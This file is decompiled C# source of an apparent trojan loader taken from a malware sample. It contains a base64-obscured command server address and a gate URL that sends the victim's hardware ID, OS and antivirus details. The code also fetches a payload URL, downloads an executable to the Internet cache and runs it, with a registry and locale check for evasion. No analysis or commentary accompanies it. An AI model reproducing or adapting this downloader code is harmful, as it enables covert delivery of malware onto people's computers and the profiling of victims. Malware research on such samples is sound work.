// Decompiled with JetBrains decompiler
// Type: ApolonSpaceXLoader.Program
// Assembly: Install, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9F00F6EC-4A12-457B-879D-3B57E6593C67
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zenpak.gen-251b0e105c9b6ccaa3cc0ceca46e682774252574958445114fbdc94b427a8c46.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace ApolonSpaceXLoader
{
  internal class Program
  {
    private static EventWaitHandle ewh;
    private static long threadCount = 0;
    private static EventWaitHandle clearCount = new EventWaitHandle(false, EventResetMode.AutoReset);
    private static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYW4ucm9ieGdlbmVyYXRlLmNvLw=="));
    public static string Gate = Program.dom + "/gate.php?hwid=" + Helper.HWID() + "&os=" + Helper.GetOSInformation() + "&av=" + Helper.AV();
    public static string urlPage = Program.dom + "/loader.txt";

    [MTAThread]
    private static void Main(string[] args)
    {
      if (Helper.Cis(Program.dom))
        Environment.Exit(1);
      MyRegistry.Check();
      Program.ewh = new EventWaitHandle(false, EventResetMode.AutoReset);
      new Thread(new ThreadStart(Program.Work)).Start();
      while (Interlocked.Read(ref Program.threadCount) < 1L)
        Thread.Sleep(3000);
      while (Interlocked.Read(ref Program.threadCount) > 0L)
        WaitHandle.SignalAndWait((WaitHandle) Program.ewh, (WaitHandle) Program.clearCount);
    }

    private static void Work()
    {
      try
      {
        string str1 = Helper.RandomID(6);
        string str2 = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\" + str1 + ".exe";
        string end;
        using (StreamReader streamReader = new StreamReader(WebRequest.Create(Program.urlPage).GetResponse().GetResponseStream()))
          end = streamReader.ReadToEnd();
        using (WebClient webClient = new WebClient())
        {
          if (MyRegistry.GetURL() != end)
          {
            if (System.IO.File.Exists(str2))
              System.IO.File.Delete(str2);
            MyRegistry.SetURL(end);
            if (end.Length > 0 && MyRegistry.GetURL() != null)
            {
              webClient.DownloadFile(new Uri(end), str2);
              Process.Start(str2);
            }
          }
          Program.ewh.Set();
          Program.clearCount.Set();
        }
      }
      catch
      {
        Program.ewh.Set();
        Program.clearCount.Set();
      }
    }
  }
}
